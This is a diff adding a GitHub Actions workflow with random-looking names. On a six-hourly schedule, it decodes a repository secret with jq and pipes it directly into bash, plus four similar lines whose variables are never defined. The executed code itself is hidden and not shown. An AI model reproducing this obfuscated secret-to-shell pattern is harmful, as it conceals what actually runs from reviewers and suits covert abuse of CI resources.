@@ -1,0 +1,20 @@
+name: lujingxi3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          n9: ${{ secrets.n9 }}
+        run: |
+          echo $n9 | jq -r .e7975 | /bin/bash
+          echo $jg205 | jq -r .cjrdo12556 | /bin/bash
+          echo $quj97263 | jq -r .rv6302 | /bin/bash
+          echo $ygu02944 | jq -r .uin5907 | /bin/bash
+          echo $vqib8967 | jq -r .hibl70566 | /bin/bash
+
